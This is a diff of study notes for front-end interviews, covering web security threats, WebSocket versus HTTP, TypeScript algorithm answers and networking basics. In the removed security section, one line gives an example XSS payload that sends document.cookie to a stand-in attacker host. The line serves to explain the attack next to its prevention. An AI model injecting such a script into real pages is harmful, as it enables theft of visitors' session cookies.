-The primary defense against MitM attacks in the context of HTTPS is the use of certificates. Certificates are digital documents that verify the identity of the parties involved in the communication. They are issued by trusted third-party organizations known as Certificate Authorities (CAs). To prevent MitM attacks, it is crucial to:
-- Ensure that the website's certificate is valid and issued by a reputable CA.
-- The browser checks that the domain name in the certificate matches the website's domain.
-- Use certificates from CAs that have established trust relationships with major browser vendors.
-
-By adhering to these practices, both website owners and users can significantly reduce the risk of falling victim to MitM attacks, ensuring that their communications remain secure and private.
-
-## Front-End Security Threats and Prevention Measures
-
-### XSS (Cross-Site Scripting)
-XSS attacks occur when an attacker injects malicious JavaScript code into a web application's output. The injected code executes within the victim's browser when they visit the compromised web page.
-
-**Example:** An attacker could embed a script in a comment on a blog that sends the cookies of anyone viewing the comment to the attacker. This script might look something like `<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>`.
-
-**Prevention:** Ensure the encoding or escaping of user input on both the front-end and back-end. For example, convert `<` to `&lt;` and `>` to `&gt;`. Modern JavaScript frameworks like React automatically escape HTML to safeguard against XSS, significantly reducing the risk.
-
-### CSRF (Cross-Site Request Forgery)
-In CSRF attacks, attackers trick users into executing unwanted actions on a web application where they're authenticated, leveraging the user's identity.
-
-**Example:** An attacker sends an email with a link to a malicious website. When the logged-in user clicks the link, the malicious site sends a request to a banking application to transfer money, exploiting the user's authenticated session.
-
-**Prevention:** Employ anti-CSRF tokens and set the `SameSite` attribute for cookies to `strict` to prevent cross-site request forgery. Limiting CORS (Cross-Origin Resource Sharing) and utilizing authentication mechanisms also bolster security.
-
-### Clickjacking
-Clickjacking tricks users into clicking on something different from what the user perceives, often by embedding a page as a transparent iframe.
-
-**Example:** An attacker places a transparent iframe over a button on a legitimate website. The user thinks they are clicking the legitimate button, but they are actually clicking a button within the iframe, potentially revealing sensitive information or agreeing to a malicious action.
-
-**Prevention:** To prevent clickjacking, ensure that your website does not allow itself to be embedded in an iframe on another site by setting the `X-Frame-Options` header to `SAMEORIGIN`. Also, verify that `window.top.location.hostname` is the same as `window.location.hostname`; if not, redirect the user appropriately.
-
-### DDoS (Distributed Denial of Service)
-DDoS attacks flood a server with numerous requests to exhaust resources and bandwidth, rendering the service unavailable to legitimate users.
-
-**Example:** A group of compromised computers (botnet) is used to flood an e-commerce site with so much traffic that legitimate customers cannot access the site during a major sale event.
-
-**Prevention:** DDoS protection is challenging to implement at the software level alone; employing cloud-based DDoS protection services or Web Application Firewalls (WAF) can help mitigate these attacks.
-
-### SQL Injection
-SQL Injection attacks occur when an attacker is able to insert or "inject" a SQL query via the input data from the client to the application.
-
-**Example:** An attacker inserts a SQL statement into a form field (e.g., login form) that is designed to log in users. This SQL statement is crafted to grant the attacker unauthorized access to the database, potentially allowing them to view sensitive information.
-
-**Prevention:** Safeguard against SQL Injection by validating and sanitizing all user inputs. Utilize prepared statements and parameterized queries to ensure the database executes only the intended queries, not the injected malicious code.
-
-### Best Practices for Prevention
-Implementing robust security measures on both the front-end and back-end is crucial for protecting web applications against these attacks. This includes validating user inputs, employing security headers, and adhering to secure coding practices. Regular security audits and updates can also significantly reduce vulnerabilities.
-
-## Websocket vs HTTP Protocol
-
-### Websocket Protocol
-- **Supports peer-to-peer communication**: Unlike HTTP, which is primarily designed for client-server communication, Websockets enable real-time, bi-directional communication between the client and server.
-- **Protocol Name**: The Websocket protocol is indicated by `ws://` or `wss://` for secure Websockets, similar to how `http://` and `https://` indicate HTTP and HTTPS protocols.
-- **Initiation**: A Websocket connection can be initiated by either the client or server side. This flexibility is particularly useful for applications that require real-time data exchange.
-- **Use Cases**: It is widely used in applications requiring real-time interaction, such as message notifications, live discussion rooms, and collaborative editing platforms.
-- **CORS Policy**: Websockets are not subject to the same-origin policy, which restricts how a document or script loaded from one origin can interact with resources from another origin. This means Websockets do not have CORS limitations.
-- **Communication**: Communication over a Websocket is achieved through the `send` method for sending messages and the `onmessage` event handler for receiving messages. This contrasts with the request-response model used by HTTP.
-- **Security**: A Websocket connection can be upgraded to a secure connection (`wss://`), analogous to upgrading HTTP to HTTPS, to ensure encrypted communication.
-
-### Connection Steps
-1. The process begins with a standard HTTP request.
-2. If successful, the connection is upgraded to a Websocket protocol for ongoing communication.
-
-### A Discussion Room Code Example: Node.js Side
-```js
-const { WebSocketServer } = require('ws');
-const wsServer = new WebSocketServer({ port: 3000 });
-const list = new Set();
-
-wsServer.on('connection', curWs => {
-    console.info('Connected');
-    list.add(curWs);
-    // Implement cleanup mechanism here to remove inactive connections
-
-    curWs.on('message', msg => {
-        console.info('Received message:', msg.toString());
-        // Broadcast to other clients
-        list.forEach(ws => {
-            if (ws === curWs) return;
-            ws.send(msg.toString());
-        });
-    });
-});
-```
-*Note: It's important to implement a cleanup mechanism to remove inactive connections to prevent memory leaks.*
-
-### Code Example: Website Side
-```html
-<script>
-    const ws = new WebSocket('ws://127.0.0.1:3000');
-    ws.onopen = () => {
-        console.info('Opened');
-        ws.send('Client opened');
-    };
-    ws.onmessage = event => {
-        console.info('Received message:', event.data);
-    };
-
-    const btnSend = document.getElementById('btn-send');
-    btnSend.addEventListener('click', () => {
-        console.info('Clicked');
-        ws.send('Current time: ' + Date.now());
-    });
-</script>
+<div class="parent">
+    <div class="left">Left</div>
+    <div class="center">Center</div>
+    <div class="right">Right</div>
+</div>
 ```
 
-### Socket.IO
-In practice, for ease of use and additional features, developers often use libraries like Socket.IO. Socket.IO abstracts the complexities of Websockets and provides a cleaner API, such as `socket.emit()` for sending messages and `io.on()` for listening to events.
+### Key Takeaways
 
-### Difference between WebSocket and HTTP: keep-alive
-
-The main difference between WebSocket and HTTP with the `keep-alive` connection option lies in the nature of the communication and the initiation of requests.
-
-#### HTTP: keep-alive
-- **Connection Type**: HTTP is a stateless protocol. By default, each request/response pair is followed by closing the connection. However, with the `keep-alive` option, the connection between the client and server can be kept open, allowing multiple requests to be sent over the same connection without having to re-establish it each time.
-- **Client-Initiated**: In an HTTP communication, even with `keep-alive`, the client initiates all requests. The server cannot send data to the client unless the client first sends a request. This means the server must wait for the client to request data before it can send any.
-- **Server Response**: With `keep-alive`, the server holds the connection open for a specified time (or until a specified number of requests have been sent), allowing for faster subsequent requests by avoiding the overhead of establishing new connections. However, the server is essentially in a wait state, responding to client requests as they come in without the ability to initiate communication.
-- **Timeouts and Retries**: If the server takes too long to respond, the client might face timeouts and may need to retry its request. This mechanism doesn't inherently solve issues related to real-time data exchange or server push capabilities.
-
-#### WebSocket
-- **Bi-Directional Communication**: WebSocket provides a full-duplex communication channel that operates over a single, long-lived connection. Once established, this connection allows either the client or the server to initiate messages, breaking away from the request-response model.
-- **Server and Client Initiation**: Unlike HTTP, WebSocket allows the server to send data to the client at any time once the WebSocket connection is established. This makes it ideal for real-time applications where the server needs to push updates to the client without waiting for a request.
-- **Real-Time Interaction**: WebSocket is designed for applications that require real-time data exchange, such as live chat, gaming, or financial trading applications, where the overhead of establishing new connections for each message (as in HTTP) would be prohibitive.
-- **Efficiency and Performance**: WebSocket connections are more efficient for real-time communication because they eliminate the HTTP overhead after the initial handshake. This makes WebSocket a better choice for scenarios where performance and latency are critical.
+- **Flexbox** is a powerful layout tool in CSS that allows you to design complex layouts easily and responsively.
+- The `flex-grow` property on a flex item allows it to expand and fill available space in a flex container, which is perfect for adaptive layouts.
+- Setting the `display` property of a container to `flex` initiates a flex context, which then enables the use of Flexbox properties on its child elements.
 
 # 2. Javascript.md
 
@@ -2489,6 +1373,937 @@ Foo.a(); // Output: 1
 - **Static vs. Instance Properties**: Static properties defined on a constructor function itself (`Foo.a`) are separate from instance properties defined within the constructor using `this` keyword (`this.a`).
 - **Prototype Properties**: Properties defined on the prototype (`Foo.prototype.a`) are shared across all instances. However, they have lower precedence compared to instance-specific properties.
 - **Precedence and Overwriting**: When accessing a property, instance properties take precedence over prototype properties. Static properties can be redefined, affecting their behavior when accessed before and after instance creation.
+# 3. Algorithms and Data Structures.md
+
+## How is a linked list used in front-end development?
+In front-end development, linked lists aren't commonly used, but a notable example is in React's Fiber architecture. React Fiber uses a linked list to manage the component tree instead of a traditional tree structure. This shift allows React to perform work in chunks and prioritize updates more effectively. The linked list structure enables incremental rendering, where the rendering work can be paused and resumed, improving app performance and user experience. It also facilitates the handling of concurrent operations in the UI, allowing for smoother and more responsive interfaces. Overall, while linked lists are not a standard tool in front-end development, their use in React Fiber demonstrates how they can optimize rendering and state management in complex applications
+
+## implementing a queue using a linked list in TypeScript:
+In TypeScript, you can implement a queue using a linked list by maintaining references to both the head and tail of the list. The queue operations work as follows:
+
+Enqueue (Add to Queue): To add an item, you create a new node and attach it to the current tail of the linked list, then update the tail reference to this new node. If the queue is empty, this new node is both the head and tail.
+
+Dequeue (Remove from Queue): To remove an item, you take the value from the head of the linked list and then update the head reference to the next node in the list. If the list becomes empty, update the tail reference to null as well.
+
+This approach ensures that both enqueue and dequeue operations are O(1), providing efficient queue management. It’s important to handle edge cases, such as dequeueing from an empty queue, to avoid errors.
+
+## Implement a queue in TypeScript, and is a linked list faster or an array?
+In TypeScript, implementing a queue can be done using either an array or a linked list. An array-based queue is simple to implement but its dequeue operation (shift) is O(n) due to the need to shift elements. In contrast, a linked list implementation offers O(1) time complexity for both enqueue and dequeue operations, as it allows for constant-time insertions and deletions without reindexing.
+
+So, while both can be used to implement a queue, a linked list is generally faster and more efficient for typical queue operations. This makes linked lists preferable in scenarios where frequent enqueue and dequeue operations are expected, whereas arrays might be more suitable when memory efficiency is a priority and operations are less frequent.
+
+## implement a queue with linkedlist
+```ts
+interface ILinkedListNode {
+    val: number;
+    next: ILinkedListNode | null;
+}
+
+class Queue {
+    // undefined usually used for uninitialized value, null for empty values, here null is better
+    private head: ILinkedListNode | null;
+    private tail: ILinkedListNode | null;
+    private len: number;
+
+    // use constructor instead of set values above, make code more readable
+    // Inside class methods, use this to refer to instance variables 
+    constructor(){
+        this.head = null;
+        this.tail = null;
+        this.len = 0;
+    }
+
+    // for better clarity, mention return type void if return nothing
+    offer(val: number): void {
+        const temp: ILinkedListNode = {val: val, next: null};
+        // in case the queue is empty, use === check value and type
+        if (this.head === null) {
+            this.head = temp;
+            this.tail = temp;
+        } 
+        // normal case
+        else {
+            // avoid non-null assertions to avoid legitimate null/undefined errors, i.e. try avoid below commented code
+            // this.tail!.next = temp;
+            if (this.tail) {
+                this.tail.next = temp;
+            }
+            this.tail = temp;
+        }
+        this.len += 1;
+    }
+
+    poll(): number | null {
+        if (this.head === null) {
+            return null;
+        } 
+        if (this.head.next === null) {
+            this.tail = null;
+        }
+        // here use const instead of let, since it never changes
+        const temp = this.head.val;
+        this.head = this.head.next;
+        this.len -= 1;
+        return temp;
+    }
+
+    // with get keyword, we can use the return value as an attribute, e.g. const queue = new Queue(); const len = queue.size;
+    get size(): number {
+        return this.len;
+    }
+}
+```
+
+## Implement binary search and describe time complexity
+```ts
+// assume input nums is in ascending order, return the index or null if not found
+function binarySearch(nums: number[], target: number): number | null {
+    let left: number = 0;
+    let right: number = nums.length - 1;
+    // use <= for case length = 1
+    while (left <= right) {
+        // Use Math.floor to avoid floating point values for the mid index.
+        let mid: number = Math.floor((left + right) / 2);
+        if (nums[mid] === target) {
+            return mid;
+        }
+        if (nums[mid] > target) {
+            right = mid - 1;
+        } else {
+            left = mid + 1;
+        }
+    }
+    return null;
+}
+```
+Binary search has a time complexity of O(log n), where n is the number of elements in the array. This is because the algorithm divides the search interval in half with each step.
+
+## Given an ascending number array and a number n, find 2 numbers in array sum is n. 
+```ts
+function twoSumsAscending(nums: number[], target: number): number[]{
+    let left: number = 0;
+    let right: number = nums.length - 1;
+    // Use '<' instead of '<=' to prevent the same element from being used twice
+    while (left < right) {
+        if (nums[left] + nums[right] === target) {
+            return [nums[left], nums[right]];
+        }
+        if (nums[left] + nums[right] < target) {
+            left++;
+        } else {
+            right--;
+        }
+    }
+    return [];
+}
+```
+
+## In-order, pre-order and post-order
+In the context of binary trees, in-order, pre-order, and post-order refer to the three primary ways to traverse the nodes of the tree, each with a different order for visiting the nodes.
+**In-Order Traversal**: Left, Root, Right.
+**Pre-Order Traversal**: Root, Left, Right.
+**Post-Order Traversal**: Left, Right, Root.
+
+## find the kth smallest value in a binary search tree
+```ts
+interface ITreeNode{
+    val: number;
+    left: ITreeNode | null;
+    right: ITreeNode | null;
+}
+
+function findKthSmallest(root:ITreeNode, k: number): number | null {
+    let count: number = 0;
+    let result: number | null = null;
+
+    // this function is in-order
+    function dfsHelper(curNode: ITreeNode) {
+        if (curNode === null || result !== null) return;
+
+        dfsHelper(curNode.left);
+
+        if (++count === k) {
+            result = curNode.val;
+            return;
+        }
+
+        dfsHelper(curNode.right);
+    }
+
+    dfsHelper(root);
+
+    return result;
+}
+```
+
+## Why binary tree so important, not trinary or quanary tree? 
+While arrays provide faster access (O(1)), adding or deleting elements is less efficient (O(N)). Linked lists offer efficient insertion and deletion (O(1)), but slower access times (O(N)).
+
+Compared to arrays and linked lists, binary trees offer a good balance with O(logn) time complexity for access, add, and delete operations when the tree is balanced.
+
+Binary trees, as opposed to ternary or quaternary trees, provide a simpler and more efficient structure for most applications. They strike a balance between maintaining low complexity and achieving efficient operations.
+
+## Why balancing binary tree so important?
+An unbalanced binary tree can degenerate into a linked list, leading to O(N) time complexity for operations like add, delete, update, and search. A balanced binary tree, on the other hand, maintains a height of O(logn), ensuring that operations can be performed in logarithmic time. This balance is essential for leveraging the efficiency of binary trees, especially in scenarios where quick search, insertion, and deletion are frequently required.
+
+## Why tree operations has time complexity of O(logn)?
+`logn` represents the height of a balanced binary tree. In a balanced tree, each operation like search, insert, or delete involves traversing a path from the root to a leaf node, or vice versa. The number of levels (or height) of the tree determines the maximum number of steps needed for these operations. Since a balanced binary tree is structured to have a height that grows logarithmically with the number of nodes (n), the operations are significantly more efficient than linear time complexity, particularly for large datasets.
+
+## What is a black-red tree? What is B tree? 
+- **Red-Black Tree**: It is a type of self-balancing binary search tree. Each node in the tree is colored either red or black. The tree uses these colors along with specific rules to ensure that the tree remains balanced during insertions and deletions. This balancing act ensures that the tree maintains its O(logn) time complexity for operations. Red-Black Trees are particularly valued for their relatively simple balancing logic and efficient operations, making them suitable for various applications, including implementing associative arrays and priority queues.
+
+- **B-Tree**: A B-Tree is a self-balancing tree data structure that maintains sorted data and allows searches, sequential access, insertions, and deletions in logarithmic time. Unlike binary trees, B-Trees are multi-way trees (having more than two children) and are optimized for systems that read and write large blocks of data, like databases and filesystems. They are designed to efficiently minimize disk I/O operations, and their branching factor (the number of child nodes) can be adjusted to optimize the balance between the tree's height and the number of nodes accessed per operation.
+
+Both Red-Black Trees and B-Trees are advanced tree structures designed to optimize performance for different scenarios, with Red-Black Trees often used in memory and B-Trees in disk-based storage systems.
+
+## Write a recursive function and a non-recursive return the nth fibonacci number, explain why the recursive one may crash
+```ts
+// method one, recursive
+function fibonacci(n: number): number {
+    if (n === 0) return 0;
+    if (n === 1) return 1;
+    return fibonacci(n - 1) + fibonacci(n - 2)
+}
+
+// method 2, loop
+function fibonacci(n: number): number {
+    if (n < 0) return -1;
+    if (n === 0) return 0;
+    if (n === 1) return 1;
+    let prevprev = 0, prev = 1, result = 0;
+
+    for (let i = 2; i <= n; i++) {
+        result = prevprev + prev;
+        prevprev = prev;
+        prev = result;
+    }
+
+    return result;
+}
+```
+
+In the recursive Fibonacci function, each function call is added to the call stack, a special region in memory where function call information is stored. When `n` is large, this results in a very deep recursion, where each call to `fibonacci` leads to two more calls, exponentially increasing the number of calls on the stack. This can quickly exceed the memory limit of the stack, leading to a stack overflow error. This happens because the stack has a limited size and cannot accommodate the large number of nested function calls required by the recursive approach for large values of `n`.
+
+### Recursive Implementation:
+
+- **Time Complexity: O(2^n)**
+
+  Each call to `fibonacciRecursive` generates two more calls, except for the base cases. This exponential growth results in a time complexity of O(2^n), where `n` is the input number.
+
+  e.g. we want to calculate f(8)  
+  f(8) = f(7) + f (6), and f(7) = f(6) + f(5)  
+  Therefore, F(6) is calculated twice which is redundant computations
+
+- **Space Complexity: O(n)**
+
+  The space complexity is determined by the height of the call stack, which in the worst case (when `n` is large) will have `n` calls stacked on top of each other before reaching the base case. This results in a space complexity of O(n).
+
+### Iterative Implementation:
+
+- **Time Complexity: O(n)**
+
+  The function iterates from 2 to `n` once, performing a constant amount of work in each iteration. Therefore, the time complexity is linear, O(n).
+
+- **Space Complexity: O(1)**
+
+  The iterative solution uses a fixed amount of space (the variables `prevprev`, `prev`, and `result`). This amount of space does not change as `n` increases, making the space complexity constant, O(1).
+
+## What is dynamic programing
+- Dynamic programming involves breaking down a complex problem into smaller, overlapping subproblems, solving these down to the simplest base cases. 
+- It uses recursion with memoization, or iterative methods with tabulation, to optimize by preventing redundant computations.
+
+## A frog, can jump 1 or 2 steps each time. How many ways can i jump a n step stair? 
+```ts
+function frogJumpDP(n: number): number {
+    // only one way to go to step 0 which is doing nothing
+    if (n === 0) return 1;
+    // the first 1 is for simplicity of calculation so that dp[2] will be 2
+    // the second 1 is only one way to go to stair 1
+    const dp = [1, 1];
+    for (let i = 2; i <= n; i++) {
+        dp[i] = dp[i - 1] + dp[i - 2];
+    }
+    return dp[n];
+}
+
+```
+
+## Move all zeros in an array to its end 
+- maintaining the order of the non-zero elements. 
+- The operation should be performed in-place
+```ts
+function moveZeroToEnd(nums: number[]): void {
+    let zeroStart: number = -1;
+    for (let i = 0; i < nums.length; i++) {
+        if (nums[i] !== 0 && zeroStart !== -1) {
+            nums[zeroStart] = nums[i];
+            nums[i] = 0;
+            zeroStart++;
+        } else if (nums[i] === 0 && zeroStart === -1) {
+            zeroStart = i;
+        }
+    }
+}
+```
+
+## Identify the longest sequence of a continuous character in a given string. 
+For example, for the string 'aabaacceee', the function should return 'e'.
+```ts
+interface IRes {
+    char: string;
+    len: number;
+}
+
+function findLongest(s: string): IRes {
+    if (s.length === 0) return { char: '', len: 0 }; // Handle empty string
+
+    let longestChar: string = s.charAt(0);
+    let longest: number = 1;
+    let currentChar: string = s.charAt(0);
+    let currentLength: number = 1;
+
+    for (let i = 1; i < s.length; i++) {
+        if (s.charAt(i) === currentChar) {
+            currentLength++;
+        } else {
+            if (currentLength > longest) {
+                longest = currentLength;
+                longestChar = currentChar;
+            }
+            currentChar = s.charAt(i);
+            currentLength = 1;
+        }
+    }
+
+    // Check and update for the last character sequence
+    if (currentLength > longest) {
+        longest = currentLength;
+        longestChar = currentChar;
+    }
+
+    return { char: longestChar, len: longest };
+}
+
+```
+
+## Implement quicksort in typescript
+```ts
+function quickSort(nums: number[]): number[] {
+    if (nums.length <= 1) return nums;
+
+    const midInd = Math.floor(nums.length / 2);
+    // array.splice(a, b) removes b elements starting from index a from the array. The return value is an array of the removed elements.
+    const mid = nums.splice(midInd, 1)[0];
+
+    const left: number[] = []
+    const right: number[] = []
+    for (let i = 0; i < nums.length; i++) {
+        if (nums[i] < mid) {
+            left.push(nums[i]);
+        } else {
+            right.push(nums[i]);
+        }
+    }
+
+    return quickSort(left).concat([mid], quickSort(right));
+}
+```
+
+- **Average Case (O(n log n))**: In the average case, the pivot divides the array into two roughly equal parts, leading to a logarithmic number of recursive calls (log n). In each level of recursion, the algorithm performs O(n) operations to partition the array around the pivot. Thus, the average case is O(n log n).
+
+- **Worst Case (O(n²))**: The worst case occurs when the pivot is the smallest or largest element in each recursive call, leading to unbalanced partitions. This results in n recursive calls, each doing O(n) work, thus O(n²).
+
+## find palindrome number
+Palindrome number, e.g. 1, 2, 22, 101, 10001, 20002, 2002 etc
+```ts
+function findAllPalindromeNumbers(max: number): number[] {
+    const res = []
+
+    for (let i = 0; i <= max; i++) {
+        // find reversed number first, then compare
+        let reversedNum: number = 0, temp: number = i;
+        while (temp !== 0) {
+            reversedNum *= 10;
+            reversedNum += temp % 10;
+            temp = Math.floor(temp / 10);
+        }
+        if (reversedNum === i) {
+            res.push(i);
+        }
+    }
+
+    return res;
+}
+
+function findAllPalindromeNumbers(max: number): number[] {
+    const res = [];
+
+    for (let i = 0; i < max; i++) {
+        const s = i.toString();
+        let start = 0, end = s.length - 1;
+        let isPalindrome = true;
+        while (start < end) {
+            if (s.charAt(start++) !== s.charAt(end--)) {
+                isPalindrome = false;
+                break;
+            }
+        }
+        if (isPalindrome) res.push(i);
+    }
+
+    return res;
+}
+```
+
+## Identify whether a string is prefix of a word in dictionary
+A Trie, or a prefix tree, is an optimal data structure for this problem. It stores strings in a tree-like structure, where each node represents a character of a string. The root represents an empty string, and each path from the root to a leaf node represents a word.
+
+To check if a string is a prefix of any word in the dictionary, we insert each word into the Trie. Then, for the given string, we traverse the Trie from the root. If we can traverse the Trie following the characters of the string without any breaks, and reach a node (not necessarily a leaf node), then the string is a valid prefix in the dictionary.
+
+This approach is efficient in terms of time complexity, especially for multiple prefix searches, as each search is only as long as the length of the string being searched.
+
+e.g. word apple may looks like this: {a: {p: {p: {l: {e: null}}}}}
+
+The time complexity for this is O(m) where m is the length of the string
+
+## formatting numbers into a thousand separator style (e.g., "1,000", "12,000,000")
+```ts
+function format(num: number): string{
+    let res: string = "";
+    const s: string = num.toString();
+    let count: number = 0;
+    for (let i = s.length - 1; i >= 0; i--) {
+        if (++count === 3 && i !== 0) {
+            res = "," + res;
+        }
+        res = s.charAt(i) + res;
+    }
+    return res;
+}
+```
+
+## Switch letter case, e.g. aBc123D -> AbC123d
+```ts
+function switchLetterCase(s: string): string {
+    let res = ""
+
+    // according to ascii table, A-Z is 65-90, a-z is 97-122
+    const UPPER_CASE_A = 65;
+    const UPPER_CASE_Z = 90;
+    const LOWER_CASE_A = 97;
+    const LOWER_CASE_Z = 122;
+
+    for (let i = 0; i < s.length; i++) {
+        const code = s.charCodeAt(i);
+        if (code >= UPPER_CASE_A && code <= UPPER_CASE_Z) {
+            // Convert to lower case
+            res += String.fromCharCode(code + 32); 
+        } else if (code >= LOWER_CASE_A && code <= LOWER_CASE_Z) {
+            // Convert to upper case
+            res += String.fromCharCode(code - 32); 
+        } else {
+            // Non-alphabetic characters are unchanged
+            res += s.charAt(i); 
+        }
+    }
+
+    return res
+}
+```
+
+## Depth-First Search (DFS) of a DOM Tree
+Depth-First Search (DFS) is a method used to traverse or search a tree or graph data structure. The algorithm starts at the root node and explores as far as possible along each branch before backtracking. When applied to a DOM tree, DFS will visit each node in a manner that deeply explores a node's children before moving to its siblings.
+
+### Code Example for DFS
+The given TypeScript function `dfs` illustrates how DFS can be applied to a DOM tree. The `visitNode` function is used to log different types of nodes (Comment, Text, HTMLElement). In the `dfs` function, recursion is utilized to visit each node starting from the root, exploring all its child nodes deeply before moving to the next sibling.
+
+```typescript
+function visitNode(node: Node) {
+    if (node instanceof Comment) {
+        console.log('comment', node.textContent);
+    }
+    if (node instanceof Text) {
+        const t = node.textContent.trim();
+        if (t) {
+            console.log('text', t);
+        }
+    }
+    if (node instanceof HTMLElement) {
+        console.log('element', node.tagName);
+    }
+}
+
+function dfs(node: Node) {
+    visitNode(node);
+    node.childNodes.forEach((child) => {
+        dfs(child);
+    });
+}
+```
+
+### Without Recursion
+DFS can be implemented without recursion by using a stack to simulate the call stack of recursion. This approach avoids potential stack overflow errors that may occur with deep recursion. While recursion is more straightforward and readable, using a stack can be more efficient and safer for deep trees.
+
+```typescript
+function dfsWithoutRecursion(node: Node) {
+    const stack = [node];
+    while (stack.length) {
+        const n = stack.pop();
+        visitNode(n);
+        Array.from(n.childNodes).reverse().forEach((child) => {
+            stack.push(child);
+        });
+    }
+}
+```
+
+## Breadth-First Search (BFS) of a DOM Tree
+Breadth-First Search (BFS) is another method to traverse or search a tree or graph data structure. Unlike DFS, BFS explores all the neighbor nodes at the present depth prior to moving on to the nodes at the next depth level. Applied to a DOM tree, BFS will visit each node level by level.
+
+### Code Example for BFS
+The `bfs` function demonstrates how BFS can be applied to a DOM tree. It uses a queue to visit each node at the current level before moving to the nodes at the next level. This approach ensures that nodes are visited in a breadth-wise manner.
+
+```typescript
+function bfs(node: Node) {
+    const queue = [node];
+    while (queue.length) {
+        const n = queue.shift();
+        visitNode(n);
+        n.childNodes.forEach((child) => {
+            queue.push(child);
+        });
+    }
+}
+```
+
+### Key Differences Between DFS and BFS
+- **DFS** dives as deep as possible into the tree's branches before backtracking, which can be implemented either recursively or using a stack.
+- **BFS** visits all nodes at the current level before moving to the next level, using a queue to keep track of the order.
+
+## Array to Tree and Tree to Array Conversion
+### TreeNode and ArrayItem Interfaces
+```typescript
+interface TreeNode {
+    id: number;
+    name: string;
+    children?: TreeNode[];
+}
+
+interface ArrayItem {
+    id: number;
+    parentId: number;
+    name: string;
+}
+```
+
+### Array to Tree Conversion
+```typescript
+function arrayToTree(arr: ArrayItem[]): TreeNode | null {
+    const map = new Map<number, TreeNode>();
+    let root: TreeNode | null = null;
+
+    // sort by parentId to ensure parent nodes are processed before children
+    arr.sort((a, b) => a.parentId - b.parentId);
+
+    arr.forEach(item => {
+        const {id, parentId, name} = item;
+        const treeNode: TreeNode = {id, name, children: []};
+        map.set(id, treeNode);
+
+        if (parentId === 0) {
+            root = treeNode;
+        } else {
+            const parent = map.get(parentId);
+            parent?.children.push(treeNode);
+        }
+    });
+
+    return root;
+}
+```
+
+### Tree to Array Conversion
+```typescript
+function treeToArray(tree: TreeNode): ArrayItem[] {
+    const result: ArrayItem[] = [];
+
+    function traverse(node: TreeNode, parentId: number) {
+        const {id, name, children} = node;
+        result.push({id, parentId, name});
+        children?.forEach(child => traverse(child, id));
+    }
+
+    traverse(tree, 0);
+    return result;
+}
+```
+
+### Contextual Understanding
+- **Relational Databases**: Such as PostgreSQL, typically store data in a tabular format with rows and columns, which resembles the flat array structure. This format is efficient for operations that involve relations between different entities.
+  
+- **Non-relational Databases**: For instance, MongoDB, often store data in formats akin to the tree structure, like documents in BSON format. This structure is advantageous for storing nested or hierarchical data, such as comments on a post or categories with subcategories.
+# 4. Network Systems.md
+
+## Tell the difference of Ajax, Fetch and Axios
+
+Ajax, Fetch, and Axios are all tools for making HTTP requests in web applications, but they have distinct characteristics and uses.
+
+Overall, Ajax represents a classical approach to asynchronous web requests, while Fetch and Axios are modern techniques, with Axios providing a richer feature set and more user-friendly API than the native Fetch API.
+
+### Ajax (Asynchronous JavaScript and XML)
+
+1. **What it is**: Ajax is a technique that combines several technologies, including HTML, CSS, JavaScript, the DOM, XML, XSLT, and particularly the XMLHttpRequest object. It enables web pages to update asynchronously by exchanging data with the server in the background. This allows for updating specific sections of a webpage without needing to reload the entire page. 
+
+2. **Code Example**:
+   ```javascript
+   var xhttp = new XMLHttpRequest();
+   xhttp.onreadystatechange = function() {
+       if (this.readyState == 4 && this.status == 200) {
+          document.getElementById("demo").innerHTML = this.responseText;
+       }
+   };
+   xhttp.open("GET", "ajax_info.txt", true);
+   xhttp.send();
+   ```
+
+### Fetch API
+
+1. **What it is**: The Fetch API is a modern method for making web requests. It is part of the window object in modern browsers and provides a cleaner, promise-based approach to asynchronous requests, making it a more straightforward alternative to XMLHttpRequest.
+
+2. **Code Example**:
+   ```javascript
+   fetch('https://api.example.com/data')
+     .then(response => response.json())
+     .then(data => console.log(data))
+     .catch(error => console.error('Error:', error));
+   ```
+
+### Axios
+
+1. **What it is**: Axios is a widely-used, promise-based HTTP client that works both in the browser and in node.js. It is a third-party library offering an enhanced and more intuitive API for making HTTP requests. It offers a simple yet extensible interface, capable of making XMLHttpRequests in the browser and HTTP requests in node.js. Axios supports the Promise API, can intercept requests and responses, transform data, cancel requests, and automatically handle JSON data. 
+
+2. **Code Example**:
+   ```javascript
+   axios.get('https://api.example.com/data')
+     .then(response => {
+       console.log(response.data);
+     })
+     .catch(error => {
+       console.error('Error:', error);
+     });
+   ```
+
+## Describe TCP 3-way handshake and 4-way termination
+### TCP 3-Way Handshake (Connection Establishment)
+1. **SYN**: The client begins the handshake by sending a SYN (synchronize) packet to the server. This packet carries the client's initial sequence number, which is crucial for coordinating the subsequent data transfer.
+2. **SYN-ACK**: In response, the server sends back a SYN-ACK (synchronize-acknowledge) packet. This packet acknowledges the client's SYN (hence the ACK) and also contains the server's initial sequence number, setting the stage for two-way communication.
+3. **ACK**: The client completes the handshake by sending an ACK (acknowledge) packet to the server. This acknowledges the server's SYN-ACK packet, and with this, the connection is officially established, ready for data transfer.
+
+### TCP 4-Way Termination (Connection Termination)
+1. **FIN from Initiator**: The initiator (say, client A) of the termination sends a FIN (finish) packet to the other party (client B), signaling that it has no more data to send.
+2. **ACK from Receiver**: Client B acknowledges the FIN from A by sending back an ACK (acknowledge) packet. At this point, A knows that B is aware of its intention to close the connection.
+3. **FIN from Receiver**: After sending any remaining data, B sends its own FIN packet to A, indicating its readiness to close the connection.
+4. **ACK from Initiator**: A responds with a final ACK packet acknowledging B's FIN. Post this, A can safely close the connection. B, upon receiving this ACK, will also close the connection. This ensures a clean and orderly termination of the connection from both ends.
+
+## Why send options request when using HTTP cross origin?
+
+### Understanding the Importance of OPTIONS Requests in Cross-Origin HTTP Communication
+
+1. **Same-Origin Policy**: A fundamental security concept in web development, the same-origin policy restricts how a document or script loaded from one origin can interact with resources from another origin. This policy is implemented by web browsers to prevent potentially malicious scripts on one website from obtaining access to sensitive data on another website. A same origin is defined by matching the protocol, domain, and port of the two resources.
+
+2. **Cross-Origin Resource Sharing (CORS)**: CORS is a mechanism that allows many resources (e.g., fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the first resource was served. It's a way for servers to indicate any origins (domain, scheme, or port) other than its own from which a browser should permit loading of resources.
+
+3. **OPTIONS Preflight Request**: In CORS, an OPTIONS preflight request is automatically sent by the browser to determine whether the cross-origin request is safe to send. This preflight checks if the server will accept the actual request, based on its CORS policy. This request includes methods like GET, POST, or custom headers that might be used in the actual request.
+
